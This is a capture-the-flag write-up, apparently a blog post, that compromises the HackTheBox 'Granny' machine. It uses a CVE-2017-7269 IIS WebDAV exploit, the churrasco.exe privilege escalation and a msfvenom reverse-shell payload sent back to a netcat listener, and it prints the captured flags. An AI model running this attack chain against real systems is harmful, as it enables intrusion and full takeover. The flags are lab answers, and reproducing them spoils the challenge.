---
layout: post
title: HackTheBox Granny
date: 2017-04-12
tags: [HackTheBox, Windows]
---

# Machine Synopsis
Granny, while similar to Grandpa, can be exploited using several different methods. The intended method of solving this machine is the widely-known Webdav upload vulnerability. ([Source](https://www.hackthebox.com/machines/granny))

# Enumeration

```bash
┌──(root💀shiro)-[/home/shiro]
└─# nmap -sC -sV -A 10.10.10.15  
Nmap scan report for 10.10.10.15
Host is up (0.0041s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods: 
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-webdav-scan: 
|   Server Date: Mon, 07 Feb 2022 13:06:12 GMT
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
|   WebDAV type: Unknown
|   Server Type: Microsoft-IIS/6.0
|_  Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2003|2008|XP|2000 (92%)
OS CPE: cpe:/o:microsoft:windows_server_2003::sp1 cpe:/o:microsoft:windows_server_2003::sp2 cpe:/o:microsoft:windows_server_2008::sp2 cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_2000::sp4
Aggressive OS guesses: Microsoft Windows Server 2003 SP1 or SP2 (92%), Microsoft Windows Server 2008 Enterprise SP2 (92%), Microsoft Windows Server 2003 SP2 (91%), Microsoft Windows XP SP3 (90%), Microsoft Windows 2000 SP4 or Windows XP Professional SP1 (90%), Microsoft Windows 2003 SP2 (89%), Microsoft Windows XP (87%), Microsoft Windows Server 2003 SP1 - SP2 (86%), Microsoft Windows XP SP2 or Windows Server 2003 (86%), Microsoft Windows 2000 SP4 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT     ADDRESS
1   4.33 ms 10.10.14.1
2   4.48 ms 10.10.10.15

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.83 seconds
```

![Website](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Granny/Website.png?raw=true)

It seems like the website is under construction. There was also nothing much found from directory busting.

# Exploitation

From the `nmap` scan, we know that the website is running on `Microsoft IIS httpd 6.0`.

![Google_Search](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Granny/Google_Search.png?raw=true)

It seems like this version has a vulnerability of `CVE-2017-7269`. This [GitHub](https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269) repository happens to have what we are looking for.

```bash
┌──(root💀shiro)-[/home/shiro/HackTheBox/Granny]
└─# python exploit.py 10.10.10.15 80 10.10.14.3 1234
...

┌──(shiro㉿shiro)-[~]
└─$ nc -nlvp 1234 
listening on [any] 1234 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.10.15] 1248
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

c:\windows\system32\inetsrv>whoami
nt authority\network service

C:\Documents and Settings>cd C:\Documents and Settings
C:\Documents and Settings>dir
04/12/2017  09:19 PM    <DIR>          .
04/12/2017  09:19 PM    <DIR>          ..
04/12/2017  08:48 PM    <DIR>          Administrator
04/12/2017  04:03 PM    <DIR>          All Users
04/12/2017  09:19 PM    <DIR>          Lakis
               0 File(s)              0 bytes
               5 Dir(s)   1,382,207,488 bytes free

C:\Documents and Settings>cd Lakis
Access is denied.
```

# Privilege Escalation

Let’s run `systeminfo` to view the OS version.

```powershell
C:\Documents and Settings>systeminfo

Host Name:                 GRANNY
OS Name:                   Microsoft(R) Windows(R) Server 2003, Standard Edition
OS Version:                5.2.3790 Service Pack 2 Build 3790
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Uniprocessor Free
Registered Owner:          HTB
Registered Organization:   HTB
Product ID:                69712-296-0024942-44782
Original Install Date:     4/12/2017, 5:07:40 PM
System Up Time:            0 Days, 23 Hours, 54 Minutes, 7 Seconds
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x86 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              INTEL  - 6040000
Windows Directory:         C:\WINDOWS
System Directory:          C:\WINDOWS\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (GMT+02:00) Athens, Beirut, Istanbul, Minsk
Total Physical Memory:     1,023 MB
Available Physical Memory: 733 MB
Page File: Max Size:       2,470 MB
Page File: Available:      2,285 MB
Page File: In Use:         185 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 1 Hotfix(s) Installed.
                           [01]: Q147222
Network Card(s):           N/A
```

It seems like its running on `Windows Server 2003` which is vulnerable to `MS09-012`. We can exploit this using [repository](https://github.com/egre55/windows-kernel-exploits/blob/master/MS09-012:%20Churrasco/Compiled/Churrasco.exe).

```bash
┌──(root💀shiro)-[/home/shiro/HackTheBox/Granny]
└─# wget https://github.com/Re4son/Churrasco/raw/master/churrasco.exe 

┌──(root💀shiro)-[/home/shiro/HackTheBox/Granny]
└─# impacket-smbserver kali .
```

Now, we need to create a `temp` directory in `C:\` to have writeable privileges. Then, we can copy the file over the SMB server we created.

```
c:\windows\system32\inetsrv>cd C:\
C:\>mkdir temp
C:\>cd temp
C:\temp>dir \\10.10.14.3\KALI
02/08/2022  05:09 PM    <DIR>          .
02/08/2022  02:53 PM    <DIR>          ..
02/08/2022  02:44 PM            12,312 exploit.py
02/08/2022  03:37 PM    <DIR>          wesng
02/08/2022  05:09 PM           168,179 churrasco.exe
               2 File(s)        192,779 bytes
               3 Dir(s)  15,207,469,056 bytes free

C:\temp>copy \\10.10.14.3\KALI\churrasco.exe .
        1 file(s) copied.

C:\temp>churrasco.exe
/churrasco/-->Usage: Churrasco.exe [-d] "command to run"
C:\WINDOWS\TEMP

C:\temp>churrasco.exe "whoami"         
nt authority\system

C:\temp>churrasco.exe "cmd.exe"
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

C:\WINDOWS\TEMP> whoami
nt authority\system

C:\>ipconfig

C:\temp>whoami
nt authority\network service
```

The exploit works, but only for 1 single command. We can bypass this by creating a `msfvenom` payload as an `exe` file, transfer it through SMB server and then ask the exploit to run it.

```bash
┌──(root💀shiro)-[/home/shiro/HackTheBox/Granny]
└─# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=1337 -f exe -o shell.exe

┌──(root💀shiro)-[/home/shiro/HackTheBox/Granny]
└─# impacket-smbserver kali .
...
```

```
C:\temp>copy \\10.10.14.3\KALI\shell.exe .
        1 file(s) copied.
```

Now, we can start yet another listener on our machine and execute the `shell.exe` using `churrasco.exe`!

```
C:\temp>churrasco.exe "C:\temp\shell.exe"
```

```bash
┌──(shiro㉿shiro)-[~/HackTheBox/Granny]
└─$ nc -nlvp 1337
listening on [any] 1337 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.10.15] 1041
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

C:\WINDOWS\TEMP>whoami
nt authority\system

C:\Documents and Settings>cd "C:\Documents and Settings\Lakis\Desktop"
C:\Documents and Settings\Lakis\Desktop>type user.txt
700c5dc163014e22b3e408f8703f67d1

C:\Documents and Settings\Lakis\Desktop>cd "C:\Documents and Settings\Administrator\Desktop"
C:\Documents and Settings\Administrator\Desktop>type root.txt
aa4beed1c0584445ab463a6747bd06e9
```

